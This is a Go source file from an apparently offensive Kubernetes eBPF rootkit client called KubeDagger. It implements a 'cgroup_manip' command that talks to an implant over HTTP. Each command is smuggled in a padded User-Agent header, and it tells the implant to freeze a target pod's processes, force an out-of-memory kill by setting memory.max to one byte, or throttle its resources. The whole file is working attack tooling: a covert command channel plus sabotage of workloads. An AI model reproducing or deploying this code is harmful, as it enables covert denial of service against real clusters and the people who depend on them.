package cgroup_manip

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type ManipResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, targetPod, resource, action, output string) error {
	result := &ManipResult{}

	var actions []struct {
		name   string
		detail string
		cmd    string
	}

	switch action {
	case "freeze":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"locate_cgroup", "find target pod cgroup path from /proc/<pid>/cgroup", "cg_locate"},
			{"attach_hook", "attach kprobe on cgroup_write for target cgroup inode", "cg_attach"},
			{"freeze_cgroup", "write FROZEN to cgroup.freeze to halt all processes", "cg_freeze"},
		}
	case "kill":
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"locate_cgroup", "find target pod cgroup path from /proc/<pid>/cgroup", "cg_locate"},
			{"attach_hook", "attach kprobe on cgroup_write for target cgroup inode", "cg_attach"},
			{"set_limit_zero", "set memory.max to 1 byte triggering immediate OOM kill", "cg_oom_kill"},
		}
	default: // limit
		actions = []struct {
			name   string
			detail string
			cmd    string
		}{
			{"locate_cgroup", "find target pod cgroup path from /proc/<pid>/cgroup", "cg_locate"},
			{"attach_hook", "attach kprobe on cgroup_write for target cgroup inode", "cg_attach"},
			{"reduce_limit", "reduce resource limit to 10% of current allocation", "cg_reduce"},
			{"monitor_pressure", "verify PSI (pressure stall info) shows resource contention", "cg_verify_psi"},
		}
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + targetPod + "#" + resource + "#" + action
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/cgroup_manip", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
